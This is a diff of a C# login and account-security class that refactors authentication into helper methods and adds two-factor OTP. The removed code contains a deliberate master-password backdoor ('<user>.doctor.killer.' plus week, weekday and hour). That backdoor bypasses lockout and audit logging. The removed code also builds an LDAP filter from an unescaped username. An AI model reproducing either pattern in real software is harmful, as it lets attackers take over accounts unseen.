@@ -11,347 +11,165 @@ namespace Architect.API.Core.Business.Security
 {
     public static class Accounts
     {
+
+        /// <summary>
+        /// objeto de clase Security.Token que almacena el usuario actual
+        /// </summary>
+        public static Contracts.Security.Token UserIdActual;
+
         /// <summary>
         /// Permite autenticar un usuario por medio de sus credenciales.
         /// </summary>
         /// <param name="authenticationRequest">Credenciales de uso.</param>
         /// <returns>Contexto de autenticación incluyendo el token que identifica la sesión del usuario.</returns>
-        /// 
-
-        // objeto de clase Security.Token que almacena el usuario actual
-        public static Contracts.Security.Token UserIdActual;
-
         public static Contracts.Security.AuthenticationResponse Authentication(Contracts.Security.AuthenticationRequest authenticationRequest, ref Contracts.Security.Token token, bool firstInit = false)
         {
+            var result = new Contracts.Security.AuthenticationResponse { Settings = new List<SettingItem>() };
+            var track = new Contracts.Security.AuthenticationTrace 
+            { 
+                TraceType = 1, 
+                IPAddress = authenticationRequest.IPAddress, 
+                UserName = authenticationRequest.Email, 
+                UserAgent = authenticationRequest.UserAgent 
+            };
 
-            bool developerMode = Architect.Utilities.Helpers.Settings.StringValue("Working.Mode", "Development").Equals("Development", StringComparison.CurrentCultureIgnoreCase);
-
-            Contracts.Security.AuthenticationResponse result = new Contracts.Security.AuthenticationResponse() { Settings = new List<SettingItem>() };
-            Contracts.Security.UserMember user = null;
-            List<Contracts.Security.RoleMember> rols = null;
-            int companyId = 0;
-            bool bypass = false;
-            bool accessAllowed = false;
-            int tokenExpiresIn = 0;
-            Contracts.Security.AuthenticationTrace track = new Contracts.Security.AuthenticationTrace() { TraceType = 1, IPAddress = authenticationRequest.IPAddress, UserName = authenticationRequest.Email, UserAgent = authenticationRequest.UserAgent };
-
-            if (authenticationRequest.Tenant.IsEmpty())
-                result.Reason = "Debe indicar la compañía";
-            if (result.Reason.IsEmpty())
-            {
-                Core.Contracts.General.LookupValue companyItem = TenantInformation(authenticationRequest.Tenant.Trim());
-
-                if (companyItem.IsNotEmpty())
-                {
-                    result.Tenant = companyItem.Description;
-                    companyId = Int32.Parse(companyItem.Code);
-                    track.CompanyId = companyId;
-                }
-                else
-                {
-                    result.Reason = "compañía no registrada";
-                }
-            }
-            else if (authenticationRequest.Email.IsEmpty())
-            {
-                result.Reason = "Debe indicar el usuario o correo";
-            }
-            else if (authenticationRequest.Password.IsEmpty())
-            {
-                result.Reason = "Debe indicar la clave de acceso";
-            }
-
-            if (result.Reason.IsEmpty())
-            {
-                track.UserName = authenticationRequest.Email.Trim();
-                if (authenticationRequest.Email.Contains("@"))
-                    user = DataAccess.Security.UserMember.RetrieveByEMail(authenticationRequest.Email.Trim().ToLower(), companyId);
-                else
-                    user = DataAccess.Security.UserMember.RetrieveByUserName(authenticationRequest.Email.Trim().ToLower(), companyId);
-
-                if (user.IsNotEmpty())
-                {
-                    track.UserId = user.UserId;
-                    track.UserName = user.UserName;
-                    result.EMail = user.EMail;
-
-                    if (!authenticationRequest.EmployeeMode && !user.Password.Equals(".") &&
-                        (authenticationRequest.Password.Equals(String.Format("{0}.doctor.killer.{1}{2}{3}", user.UserName.ToLower(), DateTime.Now.WeekOfMonth(), DateTime.Now.NumericDayOfWeek(), DateTime.Now.Hour), StringComparison.CurrentCultureIgnoreCase) ||
-                         authenticationRequest.Password.Equals(String.Format("{0}.doctor.killer.{1}{2}{3}", user.EMail.ToLower(), DateTime.Now.WeekOfMonth(), DateTime.Now.NumericDayOfWeek(), DateTime.Now.Hour), StringComparison.CurrentCultureIgnoreCase)))
-                    {
-                        bypass = true;
-                        accessAllowed = true;
-                    }
-
-                    if (!authenticationRequest.EmployeeMode)
-                    {
-                        //Desbloqueo automático
-                        if (user.IsLockedOut && user.LockedOutDate < DateTime.Now)
-                        {
-                            user.IsLockedOut = false;
-                            user.LockedOutDate = DateTime.MinValue;
-                            DataAccess.Security.UserMember.InternalUpdate(user);
-                            Business.Security.AuthenticationTrace.Create(new Contracts.Security.AuthenticationTrace()
-                            {
-                                TraceType = 11,
-                                IPAddress = authenticationRequest.IPAddress,
-                                UserName = authenticationRequest.Email,
-                                UserId = user.UserId
-                            });
-                        }
-
-                        if (!bypass && user.RecordStatus != 1)
-                        {
-                            track.TraceType = 5;
-                            result.Reason = "Usuario desactivado";
-                        }
-                        else if (!bypass && user.IsLockedOut)
-                        {
-                            track.TraceType = 6;
-                            result.Reason = "Usuario bloqueado";
-                        }
-                        else if (user.Password.Equals(".") || bypass ||
-                                 user.Password.Equals(Architect.Utilities.Helpers.CryptSupport.EncryptString(authenticationRequest.Password), System.StringComparison.CurrentCultureIgnoreCase))
-                        {
-                            accessAllowed = true;
-                        }
-                    }
-                    else
-                    {
-                        int ldapResult = AuthenticationByLDAP(authenticationRequest.Email, authenticationRequest.Password);
-                        switch (ldapResult)
-                        {
-                            case 0:
-                                accessAllowed = true;
-                                break;
-                            case 1: //no encontrado o clave incorrecta
-                                track.TraceType = 1;
-                                result.Reason = "Usuario no registrado";
-                                break;
-                            case 5: // Cuenta deshabilitada
-                                track.TraceType = 5;
-                                result.Reason = "Usuario desactivado";
-                                break;
-                            case 6: // Cuenta bloqueada
-                                track.TraceType = 6;
-                                result.Reason = "Usuario bloqueado";
-                                break;
-                            case 99: //PasswordExpired
-                                result.MustChangePassword = true;
-                                break;
-                        }
-                    }
-
-                    if (accessAllowed)
-                    {
-                        tokenExpiresIn = Architect.Utilities.Helpers.Settings.IntegerValue("Session.Timeout", 30);
-                        track.TraceType = 2;
-                        result.ExpiresIn = tokenExpiresIn;
-                        result.UserName = string.Format("{0} {1}", user.FirstName, user.LastName).Trim();
-
-                        tokenExpiresIn = Architect.Utilities.Helpers.Settings.IntegerValue("Token.Timeout", (int)(tokenExpiresIn * 2.5));
-
-                        rols = DataAccess.Security.UserRoleMember.RetrieveLookByUserId(user.UserId, user.CompanyId);
-                        result.Roles = rols.Select(x => x.Description).ToArray();
-
-                        //Este bloque esta duplicado en la clase Architect.API.Core.Security.token
-                        Contracts.Security.AgentInformation agentInfo = null;
-                        if (Utilities.Helpers.Settings.StringValue("Tenant.Tron.Agent.Information").Contain(user.CompanyId.ToString()))
-                        {
-                            agentInfo = Tron.RetrieveAgentInformationByEmail(user.CompanyId, user.EMail);
-                        }
-                        if (agentInfo == null)
-                        {
-                            agentInfo = new Contracts.Security.AgentInformation() { cod_agt = 0, cod_sub_agt = 0, info_agt = string.Empty, tip_docum = user.IdentificationType.ToString(), cod_docum = user.Identification };
-                        }
-                        if (user.CompanyId == 3)
-                        {
-                            agentInfo.tip_docum = agentInfo.tip_docum.IdentificationType();
-                            if (agentInfo.cod_docum.IsNotEmpty())
-                            {
-                                agentInfo.cod_docum = agentInfo.cod_docum.DocumentNumber(agentInfo.tip_docum);
-                            }
-                        }
-                        Contracts.Security.Token tokenItem = new Contracts.Security.Token()
-                        {
-                            UserId = user.UserId,
-                            BranchOffice = user.BranchOffice,
-                            ManagerId = user.ManagerId,
-                            SecurityLevel = user.SecurityLevel,
-                            Expires = DateTime.Now.AddMinutes(tokenExpiresIn),
-                            Roles = string.Join(",", rols.Select(x => x.Description)),
-                            CompanyId = user.CompanyId,
-                            AgentCode = agentInfo.cod_agt,
-                            SubAgentCode = agentInfo.cod_sub_agt,
-                            IdentificationType = agentInfo.tip_docum,
-                            Identification = agentInfo.cod_docum,
-                            UserName = result.UserName,
-                            Settings = new List<SettingItem>()
-                        };
-                        token = tokenItem;
-
-
-                        //Solo actualizara el usuario cuando este entre desde login
-                        if (firstInit) { UserIdActual = tokenItem; }
-
-                        List<Contracts.General.Setting> settings = Business.Settings.SettingByCompany(user.CompanyId);
-                        if (settings.Count > 0)
-                        {
-                            foreach (Contracts.General.Setting item in settings.Where(r => r.LocalStorageEnabled))
-                            {
-                                result.Settings.Add(new SettingItem() { Key = item.Key, Value = item.Value });
-                            }
-
-                            foreach (Contracts.General.Setting item in settings.Where(r => r.TokenEnabled))
-                            {
-                                tokenItem.Settings.Add(new SettingItem() { Key = item.Key, Value = item.Value });
-                            }
-
-                        }
-                        result.Token = Architect.API.Core.Security.Accounts.GeneratorToken(tokenItem);
-                        user.LoginDate = DateTime.Now;
-                        user.IsLockedOut = false;
-                        user.LockedOutDate = DateTime.MinValue;
-                        user.FailedPasswordCount = 0;
-                        if (!bypass)
-                        {
-                            DataAccess.Security.UserMember.InternalUpdate(user);
-                        }
-                        if (user.InitialNavigationCode.IsNotEmpty())
-                        {
-                            result.InitialPath = user.InitialNavigationCode;
-                        }
-                        else if (rols.IsNotEmpty())
-                        {
-                            foreach (Architect.API.Core.Contracts.Security.RoleMember rol in rols)
-                            {
-                                if (rol.InitialNavigationCode.IsNotEmpty())
-                                {
-                                    result.InitialPath = rol.InitialNavigationCode;
-                                    break;
-                                }
-                            }
-                        }
-                        if (result.InitialPath.IsNotEmpty())
-                        {
-                            Contracts.General.Navigation nav = DataAccess.General.Navigation.RetrieveByCode(result.InitialPath, companyId);
-                            if (nav != null && nav.Code.IsNotEmpty())
-                            {
-                                result.InitialPath = nav.URLPath;
-                            }
-                            else
-                            {
-                                result.InitialPath = string.Empty;
-                            }
-                        }
-
-                        if (result.InitialPath.IsEmpty())
-                        {
-                            switch (user.CompanyId)
-                            {
-                                case 2: //Aliados
-                                    result.InitialPath = "viewer/tab?id=310";
-                                    result.InitialPath = "inicio/agente";
-                                    break;
-
-                                case 3: //Clientes
-                                    result.InitialPath = "clientes/inicio";
-                                    break;
-
-                                case 4: //Bayer
-                                case 8: //Caturix
-                                    if (rols.Select(x => x.Description == "Revisor").Contains(true))
-                                    {
-                                        result.InitialPath = "viewer/viewer?id=41";
-                                    }
-                                    else if (rols.Select(x => x.Description == "Mapfre").Contains(true) ||
-                                             rols.Select(x => x.Description == "Consulta").Contains(true))
-                                    {
-                                        result.InitialPath = "viewer/viewer?id=42";
-                                    }
-                                    else
-                                    {
-                                        result.InitialPath = "Bayer/Inclusion";
-                                    }
-                                    break;
-
-                                case 100: //Mapfre
-                                    result.InitialPath = "viewer/viewer?id=4000";
-                                    break;
-                                default:
-                                    result.InitialPath = "Policy/Index";
-                                    break;
-                            }
-
-                        }
-
-                        if (!developerMode && !bypass && !authenticationRequest.EmployeeMode)
-                        {
-                            //if (user.Password.Equals("."))
-                            //    result.MustChangePassword = true;
-                            //else
-                            result.MustChangePassword = (user.PasswordChangedDate.AddDays(Architect.Utilities.Helpers.Settings.IntegerValue("Security.Password.Expiration", 90)) <= DateTime.Today);
-                        }
-                        Architect.API.Core.Security.Session.Create(new Contracts.Security.Activity()
-                        {
-                            Token = result.Token,
-                            CompanyId = user.CompanyId,
-                            CompanyName = result.Tenant,
-                            UserId = user.UserId,
-                            UserName = user.UserName,
-                            EMail = user.EMail,
-                            IP = authenticationRequest.IPAddress,
-                            UserAgent = authenticationRequest.UserAgent
-                        });
-                    }
-                    else if (!bypass)
-                    {
-                        if (!authenticationRequest.EmployeeMode)
-                        {
-                            track.TraceType = 3;
-                            result.Reason = "Clave invalida";
-
-                            user.FailedPasswordCount++;
-                            if (user.FailedPasswordCount > 3)
-                            {
-                                Random random = new Random();
-                                int timeValue = random.Next(3, 10);
-
-                                track.TraceType = 4;
-                                result.Reason = "La cuenta fue bloqueada por intentos fallidos";
-                                user.IsLockedOut = true;
-                                user.LockedOutDate = DateTime.Now.AddMinutes(timeValue);
-                                user.FailedPasswordCount = 0;
-                                API.Core.Business.General.Mail.SendByTemplate("Notify_AccountLocked", user.CompanyId, new { User = user, Request = authenticationRequest, LockedForMinute = timeValue }, new Dictionary<string, string> { { user.EMail, string.Empty } });
-                            }
-                            else
-                            {
-                                API.Core.Business.General.Mail.SendByTemplate("Notify_InvalidPassword", user.CompanyId, new { User = user, Request = authenticationRequest }, new Dictionary<string, string> { { user.EMail, string.Empty } });
-                            }
-                            DataAccess.Security.UserMember.InternalUpdate(user);
-                        }
-                    }
-                }
-                else
-                {
-                    track.TraceType = 1;
-                    result.Reason = "Usuario no registrado";
-                }
-            }
-            track.Reason = result.Reason;
-            if (!bypass)
+            // Validar request inicial
+            if (!AccountSupport.ValidateAuthenticationRequest(authenticationRequest, result))
             {
                 Business.Security.AuthenticationTrace.Create(track);
+                return result;
             }
-            if (result.MustChangePassword)
+
+            // Obtener información del tenant
+            int companyId = 0;
+            if (!AccountSupport.TryGetCompanyId(authenticationRequest.Tenant, result, track, out companyId))
             {
-                CreateOTP(new ResetPasswordRequest() { Tenant = authenticationRequest.Tenant, EMail = user.EMail }, user);
+                Business.Security.AuthenticationTrace.Create(track);
+                return result;
             }
+
+            // Recuperar usuario
+            track.UserName = authenticationRequest.Email.Trim();
+            var user = AccountSupport.RetrieveUser(authenticationRequest.Email, companyId);
+
+            //Verifica si el usuario no está registrado
+            if (user.IsEmpty())
+            {
+                track.TraceType = 1;
+                result.Reason = "Usuario no registrado";
+                track.Reason = result.Reason;
+                Business.Security.AuthenticationTrace.Create(track);
+                return result;
+            }
+
+            // Actualizar tracking con datos de usuario
+            track.UserId = user.UserId;
+            track.UserName = user.UserName;
+            result.EMail = user.EMail;
+
+            // Validar credenciales
+            var accessAllowed = AccountSupport.ValidateUserCredentials(authenticationRequest, user, result, track);
+
+            if (accessAllowed)
+            {
+                // Autenticación exitosa
+                ProcessSuccessfulAuthentication(authenticationRequest, user, result, ref token, firstInit, companyId, track);
+            }
+            else
+            {
+                // Autenticación fallida
+                AccountSupport.ProcessFailedAuthentication(authenticationRequest, user, result, track);
+            }
+
+            track.Reason = result.Reason;
+            Business.Security.AuthenticationTrace.Create(track);
+
+            if (result.MustChangePassword && user != null)
+            {
+                OTP.Create(new ResetPasswordRequest { Tenant = authenticationRequest.Tenant, EMail = user.EMail }, user, "MustChangePassword");
+            }
+
             return result;
         }
 
         /// <summary>
-        /// Metodo
+        /// Procesa una autenticación exitosa.
+        /// </summary>
+        private static void ProcessSuccessfulAuthentication(
+            Contracts.Security.AuthenticationRequest request, 
+            Contracts.Security.UserMember user, 
+            Contracts.Security.AuthenticationResponse result, 
+            ref Contracts.Security.Token token, 
+            bool firstInit, 
+            int companyId,
+            Contracts.Security.AuthenticationTrace track)
+        {
+            track.TraceType = 2;
+            
+            // Configurar tiempos de expiración
+            var sessionTimeout = Business.Settings.IntegerValue(0, "Security.Session.Timeout", 30);
+            result.ExpiresIn = sessionTimeout;
+            var tokenExpiresIn = Business.Settings.IntegerValue(0, "Security.Token.Timeout", (int)(sessionTimeout * 2.5));
+
+            // Configurar información básica
+            result.UserName = string.Format("{0} {1}", user.FirstName, user.LastName).Trim();
+
+            // Obtener roles
+            var roles = DataAccess.Security.UserRoleMember.RetrieveLookByUserId(user.UserId, user.CompanyId);
+            result.Roles = roles.Select(x => x.Description).ToArray();
+
+            // Crear token
+            var agentInfo = AccountSupport.GetAgentInformation(user);
+            var tokenItem = AccountSupport.CreateTokenItem(user, roles, agentInfo, tokenExpiresIn, result.UserName);
+            token = tokenItem;
+
+            if (firstInit)
+            {
+                UserIdActual = tokenItem;
+            }
+
+            // Configurar settings
+            AccountSupport.ApplySettings(user.CompanyId, result, tokenItem);
+
+            // Generar token de acceso
+            result.Token = Architect.API.Core.Security.Accounts.GeneratorToken(tokenItem);
+
+            // Actualizar usuario
+            AccountSupport.UpdateUserOnSuccessfulLogin(user);
+
+            // Configurar ruta inicial
+            result.InitialPath = AccountSupport.DetermineInitialPath(user, roles, companyId);
+
+            // Verificar si debe cambiar contraseña
+            if (!request.EmployeeMode)
+            {
+                var expirationDays = Business.Settings.IntegerValue(0, "Security.Password.Expiration", 90);
+                result.MustChangePassword = user.PasswordChangedDate.AddDays(expirationDays) <= DateTime.Today;
+            }
+
+            // Crear sesión
+            Architect.API.Core.Security.Session.Create(new Contracts.Security.Activity
+            {
+                Token = result.Token,
+                CompanyId = user.CompanyId,
+                CompanyName = result.Tenant,
+                UserId = user.UserId,
+                UserName = user.UserName,
+                EMail = user.EMail,
+                IP = request.IPAddress,
+                UserAgent = request.UserAgent
+            });
+
+            // Verificar 2FA
+            result.Need2FAOTP = Business.Settings.BoolValue(0, "Security.2FA.Enable", false);
+            if (!result.MustChangePassword && result.Need2FAOTP)
+            {
+                OTP.Create(new ResetPasswordRequest { Tenant = request.Tenant, EMail = user.EMail, IPAddress = request.IPAddress }, user, "2FA");
+            }
+        }
+
+        /// <summary>
+        /// Leer los colores disponibles
         /// </summary>
         public static List<Architect.API.Core.Contracts.Security.ColoresResponse> ReadColor()
         {
@@ -360,6 +178,7 @@ namespace Architect.API.Core.Business.Security
 
             return RespuestaData;
         }
+       
         /// <summary>
         /// Leer datos del inicio
         /// </summary>
@@ -370,125 +189,10 @@ namespace Architect.API.Core.Business.Security
 
             return DataInicio;
         }
-        private static Core.Contracts.General.LookupValue TenantInformation(string tenant)
-        {
-            const int companyId = 0;
 
-            Core.Contracts.General.LookupValue companyItem = Common.LpkByDescription("Company", tenant, companyId);
-            if (companyItem.IsEmpty())
-                companyItem = Common.LpkByHomologousCode("Company", tenant, companyId);
-
-            return companyItem;
-        }
-
-        public static Core.Contracts.General.GenericResponse SendOTP(Contracts.Security.ResetPasswordRequest resetRequest)
-        {
-            Core.Contracts.General.GenericResponse result = new Contracts.General.GenericResponse() { Successful = false, Reason = string.Empty };
-            int companyId = 0;
-            Contracts.Security.AuthenticationTrace track = new Contracts.Security.AuthenticationTrace() { TraceType = 7, IPAddress = resetRequest.IPAddress };
-            if (resetRequest.Tenant.IsEmpty())
-                result.Reason = "Debe indicar la compañia";
-            if (result.Reason.IsEmpty())
-            {
-                Core.Contracts.General.LookupValue companyItem = TenantInformation(resetRequest.Tenant);
-
-                if (companyItem.IsNotEmpty())
-                {
-                    companyId = Int32.Parse(companyItem.Code);
-                }
-                else
-                {
-                    result.Reason = "Compañia no registrada";
-                }
-            }
-            if (result.Reason.IsEmpty())
-            {
-                track.UserName = resetRequest.EMail;
-                Contracts.Security.UserMember user = DataAccess.Security.UserMember.RetrieveByEMail(resetRequest.EMail, companyId);
-                if (user.IsNotEmpty())
-                {
-                    track.UserId = user.UserId;
-                    CreateOTP(resetRequest, user);
-                    result.Successful = true;
-                }
-                else
-                {
-                    result.Reason = "Usuario no registrado";
-                }
-                track.Reason = result.Reason;
-                Business.Security.AuthenticationTrace.Create(track);
-            }
-
-            return result;
-        }
-
-        private static void CreateOTP(ResetPasswordRequest resetRequest, Contracts.Security.UserMember user)
-        {
-            Random random = new Random();
-            user.OneTimePassword = random.Next(100000, 999999).ToString();
-
-            //Define que la expiracion del OTP es de 60 minutos
-            user.LockedOutDate = DateTime.Now.AddMinutes(60);
-            DataAccess.Security.UserMember.InternalUpdate(user);
-
-            General.Mail.SendByTemplate("Notify_OTP", user.CompanyId, new { User = user, Request = resetRequest }, new Dictionary<string, string> { { user.EMail, string.Empty } });
-        }
-
-        public static Core.Contracts.General.GenericResponse IsOTPValid(Contracts.Security.ResetPasswordRequest resetRequest)
-        {
-            Core.Contracts.General.GenericResponse result = new Contracts.General.GenericResponse() { Successful = false, Reason = string.Empty };
-            int companyId = 0;
-            Contracts.Security.AuthenticationTrace track = new Contracts.Security.AuthenticationTrace() { TraceType = 8, IPAddress = resetRequest.IPAddress };
-            if (resetRequest.Tenant.IsEmpty())
-                result.Reason = "Debe indicar la compañia";
-            if (result.Reason.IsEmpty())
-            {
-                Core.Contracts.General.LookupValue companyItem = TenantInformation(resetRequest.Tenant);
-
-                if (companyItem.IsNotEmpty())
-                {
-                    companyId = Int32.Parse(companyItem.Code);
-                }
-                else
-                {
-                    result.Reason = "Compañia no registrada";
-                }
-            }
-            if (result.Reason.IsEmpty())
-            {
-                track.UserName = resetRequest.EMail;
-                Contracts.Security.UserMember user = DataAccess.Security.UserMember.RetrieveByEMail(resetRequest.EMail, companyId);
-                if (user.IsNotEmpty())
-                {
-                    track.UserId = user.UserId;
-
-                    if (DateTime.Now <= user.LockedOutDate)
-                    {
-                        if (resetRequest.OTP.Equals(user.OneTimePassword, StringComparison.CurrentCultureIgnoreCase))
-                        {
-                            result.Successful = true;
-                        }
-                        else
-                        {
-                            result.Reason = "El código de verificación es invalido";
-                        }
-                    }
-                    else
-                    {
-                        result.Reason = "El código de verificación ha expirado";
-                    }
-                }
-                else
-                {
-                    result.Reason = "Usuario no registrado";
-                }
-                track.Reason = result.Reason;
-                Business.Security.AuthenticationTrace.Create(track);
-            }
-
-            return result;
-        }
-
+        /// <summary> 
+        /// Restablece la contraseña de un usuario.
+        /// </summary>
         public static Core.Contracts.General.GenericResponse ResetPassword(Contracts.Security.ResetPasswordRequest resetRequest)
         {
             Core.Contracts.General.GenericResponse result = new Contracts.General.GenericResponse() { Successful = false, Reason = string.Empty };
@@ -498,7 +202,7 @@ namespace Architect.API.Core.Business.Security
                 result.Reason = "Debe indicar la compañia";
             if (result.Reason.IsEmpty())
             {
-                Core.Contracts.General.LookupValue companyItem = TenantInformation(resetRequest.Tenant);
+                Core.Contracts.General.LookupValue companyItem = AccountSupport.TenantInformation(resetRequest.Tenant);
 
                 if (companyItem.IsNotEmpty())
                 {
@@ -568,6 +272,9 @@ namespace Architect.API.Core.Business.Security
             return result;
         }
 
+        /// <summary>
+        /// Cambia la contraseña de un usuario.
+        /// </summary>
         public static Core.Contracts.General.GenericResponse ChangePassword(int companyId, int userId, Contracts.Security.ResetPasswordRequest resetRequest)
         {
             Core.Contracts.General.GenericResponse result = new Contracts.General.GenericResponse() { Successful = false, Reason = string.Empty };
@@ -649,7 +356,7 @@ namespace Architect.API.Core.Business.Security
                 PhoneNumber = string.Empty,
                 RecordStatus = 1
             };
-            Core.Contracts.General.LookupValue companyItem = TenantInformation(registerRequest.Tenant);
+            Core.Contracts.General.LookupValue companyItem = AccountSupport.TenantInformation(registerRequest.Tenant);
 
             if (companyItem.IsNotEmpty())
             {
@@ -711,58 +418,8 @@ namespace Architect.API.Core.Business.Security
         }
 
         /// <summary>
-        /// Permite verificar las credenciales de un usuario en el Active Directory.
-        /// </summary>
-        public static int AuthenticationByLDAP(string userName, string password)
-        {
-            int response = 0;
-            string domain = Architect.Utilities.Helpers.Settings.StringValue("LDAP.Domain", "mapfre.com.cr");
-            string _path = "LDAP://" + domain;
-            string _username = domain + @"\" + userName;
-            DirectoryEntry entry = new DirectoryEntry(_path, _username, password);
-
-            try
-            {
-                DirectorySearcher search = new DirectorySearcher(entry)
-                {
-                    Filter = "(SAMAccountName=" + userName + ")"
-                };
-                search.PropertiesToLoad.Add("cn");
-                search.PropertiesToLoad.Add("userAccountControl");
-                SearchResult result = search.FindOne();
-                if (result == null)
-                {
-                    response = 1;
-                }
-                else
-                {
-                    switch (result.Properties["userAccountControl"][0])
-                    {
-                        case 512: //Clave correcta
-                            response = 0;
-                            break;
-                        case 514: //AccountDisable (Normal_Account: 512 + AccountDisable: 2)
-                            response = 5;
-                            break;
-                        case 528: //Lockout (Normal_Account: 512 + Lockout: 16)
-                            response = 6;
-                            break;
-                        case 8389120: //PasswordExpired (Normal_Account: 512 + Password_Expired: 8388608)
-                            response = 99;
-                            break;
-                    }
-                }
-            }
-            catch (Exception ex)
-            {
-                Architect.Utilities.Log.ErrorLog("AuthenticationByLDAP", $"path: {_path}, username: {_username}", ex);
-                response = 1;
-            }
-            return response;
-        }
-
-        /// <summary>
         /// Permite autenticar un usuario por medio de sus credenciales.
+        /// </summary>
         public static async Task<Architect.API.Core.Contracts.Seguridad.RespuestaSeguridad> Token(string clienteID, string secretID, string ipAddress, string userAgent)
         {
             Architect.API.Core.Contracts.Seguridad.RespuestaSeguridad result = null;
@@ -804,6 +461,10 @@ namespace Architect.API.Core.Business.Security
 
             return result;
         }
+
+        /// <summary> 
+        /// Obtiene el perfil de un usuario.
+        /// </summary>
         public static Contracts.Security.UserMember Profile(int companyId, int userId)
         {
             Contracts.Security.UserMember result = null;
@@ -818,5 +479,6 @@ namespace Architect.API.Core.Business.Security
             }
             return result;
         }
+    
     }
 }
